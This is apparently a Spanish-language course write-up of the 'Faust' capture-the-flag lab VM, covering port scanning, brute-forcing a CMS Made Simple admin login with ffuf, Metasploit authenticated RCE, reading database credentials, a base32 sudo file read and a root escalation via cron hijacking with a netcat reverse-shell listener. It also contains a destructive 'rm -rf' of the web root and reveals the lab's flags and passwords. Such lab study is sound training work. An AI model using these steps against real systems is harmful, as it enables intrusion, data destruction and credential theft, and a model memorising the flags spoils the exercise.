---
title: "🖥️ Máquina: Faust — Hacking Ético"
aliases:
  - Faust
  - faust
  - Máquina Faust
  - VM Faust
  - Writeup Faust
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Faust

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** Enumeración web · CMS Made Simple RCE (Metasploit) · Fuerza bruta de formulario (ffuf) · Movimiento lateral (base32 sudo) · Decodificación base32 + base64 · Cron Job Hijacking  
> **Descripción:** En esta práctica descubriremos un CMS Made Simple vulnerable, obtendremos credenciales por fuerza bruta en el panel de administración, explotaremos un RCE autenticado con Metasploit y seguiremos las pistas de un mensaje críptico en el puerto 6660 para obtener la contraseña de paul. Luego leeremos un archivo oculto de nico mediante base32 con sudo, descodificaremos una cadena base64 anidada y escalaremos a root mediante un Cron Job Hijacking en /tmp.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.10`
* **`RHOST` (Víctima / Faust):** Ej. `10.0.0.9`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Faust tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos escaneando los puertos:

```bash
nmap -sT -p- 10.0.0.9
```

```text
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 13:34 CEST
Nmap scan report for 10.0.0.9
Host is up (0.00068s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6660/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```

Revisamos los servicios presentes en cada puerto:

```bash
nmap -A -p 22,80,6660 10.0.0.9
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 540a75c52656f5b05f6de1e07715c70d (RSA)
|   256 0bd789522d1316cb7496f55fdd3e528e (ECDSA)
|_  256 5a900cf52b7fba1c83024de7a2a21d5b (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Home - cool_cms
6660/tcp open  unknown
|     MESSAGE FOR WWW-DATA:
|     www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house...
|_    Paul
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!info] Resultado
> En el puerto 6660 aparece un mensaje que nos puede revelar un usuario:
> I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house... Paul
> También podemos ver ese banner con nc:

```bash
nc 10.0.0.9 6660
```

```text
MESSAGE FOR WWW-DATA:
   www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house...
   Paul
```

---

## 🌐 Fase 2: Análisis de la web y versión del CMS

Analizamos la web:

```bash
whatweb http://10.0.0.9
```

```text
http://10.0.0.9 [200 OK] Apache[2.4.38], CMS-Made-Simple[2.2.5], Cookies[CMSSESSID5aa681ed85a8],
HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], Title[Home - cool_cms]
```

> [!info] Resultado
> En la web hay un CMS llamado CMS Made Simple. Si lo buscamos en exploit-db vemos que tiene vulnerabilidades conocidas, pero el listado que obtenemos es muy amplio, por lo que vamos a tratar de averiguar la versión que tenemos delante.

Estudiando el cms podemos ver la versión con curl:

```bash
curl
```

```text
This site is powered by <a href='http://www.cmsmadesimple.org'>CMS Made Simple</a> version 2.2.5
```

```bash
whatweb -a 3 http://10.0.0.9 -v
```

También vamos a usar nikto para buscar vulnerabilidades:

```bash
nikto -h http://10.0.0.9
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: Cookie CMSSESSID5aa681ed85a8 created without the httponly flag.
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54).
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /tmp/: Directory indexing found.
+ /tmp/: This might be interesting.
+ /admin/login.php: Admin login page/section found.
+ 8080 requests: 0 error(s) and 13 item(s) reported on remote host
```

> [!info] Resultado
> Nikto nos advierte de ciertos endpoints que pueden ser interesantes:
> · http://10.0.0.9/config.php
> · http://10.0.0.9/admin/login.php
> Seguimos investigando si la versión que tenemos es vulnerable:

```bash
searchsploit simple cms 2.2.5
```

```text
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution  | php/webapps/44976.py
CMS Made Simple < 2.2.10 - SQL Injection                        | php/webapps/46635.py
```

También entramos en metasploit y vemos si hay algún exploit para este cms:

```bash
msfconsole
```

```bash
search cms made simple
```

```text
0  exploit/multi/http/cmsms_showtime2_rce          2019-03-11  normal     CMS Made Simple (CMSMS) Showtime2 File Upload RCE
   1  exploit/multi/http/cmsms_upload_rename_rce      2018-07-03  excellent  CMS Made Simple Authenticated RCE via File Upload/Copy
   2  exploit/multi/http/cmsms_object_injection_rce   2019-03-26  normal     CMS Made Simple Authenticated RCE via object injection
   3  exploit/multi/http/cmsms_file_manager_auth_rce  2023-06-07  excellent  CmsMadeSimple Authenticated File Manager RCE
```

```bash
exit
```

> [!info] Resultado
> Encontramos distintos exploits. En cualquier caso de momento todo lo encontrado necesitamos estar autentificados para explotarlo, por lo que volvemos a la web a intentar conseguir la clave por fuerza bruta.

---

## 🔑 Fase 3: Fuerza bruta del panel de administración con ffuf

Entramos en http://10.0.0.9/admin/login.php. Activamos las devtools con F12 y vamos a la pestaña red e introducimos cualquier usuario y contraseña. Pulsamos submit. Aparecen muchos paquetes pero en la parte superior hay un POST que es el de envío de credenciales. Pulsamos botón derecho en el POST, copiar valor y copiar como curl, y vamos al terminal y lo pegamos:

```bash
curl
```

Adaptamos ahora para atacar con ffuf:

```bash
ffuf -u
```

Lo volvemos a lanzar pero añadiendo al final -fs 4501:

```bash
ffuf -u
```

```text
bullshit  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
```

> [!info] Resultado
> Ya tenemos las credenciales: admin:bullshit

---

## 💥 Fase 4: Explotación RCE con Metasploit

Ahora vamos a usar un exploit con credenciales para ganar acceso. Vamos a probar el que viene con metasploit:

```bash
msfconsole
```

```bash
search cms made simple
```

```text
1  exploit/multi/http/cmsms_upload_rename_rce  2018-07-03  excellent  CMS Made Simple Authenticated RCE via File Upload/Copy
```

```bash
use 1
```

```bash
show options
```

```bash
set USERNAME admin
```

```text
USERNAME => admin
```

```bash
set PASSWORD bullshit
```

```text
PASSWORD => bullshit
```

```bash
set RHOSTS 10.0.0.9
```

```text
RHOSTS => 10.0.0.9
```

```bash
set TARGETURI /
```

```text
TARGETURI => /
```

```bash
run
```

```text
meterpreter > sysinfo
Computer    : debian
OS          : Linux debian 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
Meterpreter : php/linux
```

Entramos con un shell:

```bash
shell
```

```text
Process 20429 created.
Channel 0 created.
```

Mejoramos el shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Investigamos la máquina y vemos que hay dos usuarios además de root:

```bash
cat /etc/passwd | egrep -v "nologin|sync|false"
```

```text
paul:x:1001:1001:,,,:/home/paul:/bin/bash
nico:x:1000:1000:,,,:/home/nico:/bin/bash
```

---

## 🗄️ Fase 5: Reconocimiento interno — config.php y base de datos

Vamos a ver qué más hay por la web. Si recordamos, Nikto llamó la atención sobre el archivo config.php:

```bash
cd /var/www/html
```

```bash
cat config.php
```

```text
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms']        = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'cms_user';
$config['db_password'] = 'UltraSecurePassword';
$config['db_name']     = 'cms_db';
$config['db_prefix']   = 'cms_';
$config['timezone']    = 'Europe/Berlin';
```

> [!info] Resultado
> Hay unas credenciales de acceso a la base de datos, pero las usamos para ambos usuarios y no funcionan. Miramos por la base de datos:

```bash
mysql -u cms_user -p
```

```text
Enter password: UltraSecurePassword
```

```bash
show databases;
```

```bash
use cms_db;
```

```bash
show tables;
```

```bash
select * from cms_users;
```

> [!info] Resultado
> Aquí tenemos el hash del admin pero tenemos su contraseña por lo que no nos sirve de mucho.

```bash
exit
```

> [!info] Resultado
> Salimos de la base de datos, no hay gran cosa. Recordamos este mensaje del puerto 6660:
> www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house... Paul
> Es un poco extraño. Es un mensaje para www-data que si destruye su trabajo le deja un regalo en su casa.

---

## 🗑️ Fase 6: Pista de Paul — destruir la web

Miramos el home de paul:

```bash
ls -la /home/paul
```

> [!info] Resultado
> Está vacío de momento. Borramos la web de www-data:

```bash
rm -rf /var/www/html/*
```

> [!info] Resultado
> Al hacerlo aparece un nuevo archivo en el home de paul:

```bash
ls -la /home/paul
```

```text
-rw-r--r-- 1 paul paul   30 May 28 16:10 password.txt
```

```bash
cat /home/paul/password.txt
```

```text
Password is: YouCanBecomePaul
```

> [!info] Resultado
> Salimos del terminal anterior e iniciamos con paul:

```bash
exit
```

```bash
exit
```

```bash
exit
```

```bash
ssh paul@10.0.0.9
```

```text
paul@10.0.0.9's password: YouCanBecomePaul
```

---

## 👤 Fase 7: Movimiento lateral a nico — sudo base32 + base64

Investigando con paul nos encontramos con lo siguiente:

```bash
sudo -l
```

```text
L'utilisateur paul peut utiliser les commandes suivantes sur debian :
    (nico) /usr/bin/base32
```

> [!info] Resultado
> Es decir que podemos leer archivos codificándolos en base32 como nico, por lo que vamos a buscar archivos que pertenezcan a nico:

```bash
find / -user nico 2>/dev/null
```

```text
/nico
/home/nico/.secret.txt
```

> [!info] Resultado
> Llama la atención un directorio que hay en raíz que se llama nico, y por otro lado un secret que está en su home. Intentamos leer .secret pero no tenemos permisos:

```bash
cat /home/nico/.secret
```

```text
cat: /home/nico/.secret: Aucun fichier ou dossier de ce type
```

> [!info] Resultado
> Sin embargo podemos usar base32 para codificarlo y luego lo decodificamos y podremos leer dicho archivo:

```bash
sudo -u nico base32 /home/nico/.secret.txt
```

```text
KVEGGZ2QKQ2GOYLOKZ5GIRRZOZRG2VTGMJLTS6K2KY4WSWSXKZ4USQJ5HUFA====
```

```bash
echo KVEGGZ2QKQ2GOYLOKZ5GIRRZOZRG2VTGMJLTS6K2KY4WSWSXKZ4USQJ5HUFA==== | base32 -d
```

```text
UHcgPT4ganVzdF9vbmVfbW9yZV9iZWVyIA==
```

> [!info] Resultado
> Y esta es un base64:

```bash
echo UHcgPT4ganVzdF9vbmVfbW9yZV9iZWVyIA== | base64 -d
```

```text
Pw => just_one_more_beer
```

> [!info] Resultado
> Indica la password de nico por lo que nos pasamos a su perfil:

```bash
su nico
```

```text
Mot de passe : just_one_more_beer
```

Vamos a su home y leemos la bandera:

```bash
cd
```

```bash
ls -la
```

```bash
cat user.txt
```

```text
gamhanarhu
```

> [!info] Resultado
> Flag de usuario obtenida: gamhanarhu

Revisamos ahora al usuario nico:

```bash
id
```

```text
uid=1000(nico) gid=1000(nico) groupes=1000(nico)
```

---

## 🚀 Fase 8: Escalada de privilegios — Cron Job Hijacking en /tmp

Bajamos pspy64 para analizar tareas programadas:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

```bash
chmod +x pspy64
```

```bash
./pspy64
```

> [!info] Resultado
> Salen muchos procesos, lo vamos a guardar en un txt y luego lo revisamos. Lo dejamos un par de minutos y luego lo paramos con CTRL+C:

```bash
./pspy64 > procesos.txt
```

```bash
cat procesos.txt | grep -v 1001
```

```text
2024/06/24 23:03:01 CMD: UID=0  PID=15177  | /usr/sbin/CRON -f 
2024/06/24 23:03:01 CMD: UID=0  PID=15178  | /usr/sbin/CRON -f 
2024/06/24 23:03:01 CMD: UID=0  PID=15179  | /bin/sh -c /tmp/goodgame
```

> [!info] Resultado
> Hace una ejecución del contenido de /tmp/goodgame por lo que vamos a ese archivo y creamos una conexión inversa. Primero en otro terminal en kali lo ponemos en escucha:

```bash
nc -lnvp 9002
```

```text
listening on [any] 9002 ...
```

Y ahora ponemos una conexión inversa en el /tmp/goodgame y esperamos la conexión:

```bash

```

```bash
chmod +x /tmp/goodgame
```

> [!info] Resultado
> Esperamos hasta que se ejecute la tarea y nos llegue la conexión inversa:

```text
listening on [any] 9002 ...
connect to [10.0.0.10] from (UNKNOWN) [10.0.0.9] 47880
```

```bash
id
```

```text
uid=0(root) gid=0(root) groupes=0(root)
```

```bash
cd /root
```

```bash
ls -la
```

```bash
cat root.txt
```

```text
lasarnsilgam
```

> [!info] Resultado
> Flag de root obtenida: lasarnsilgam

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
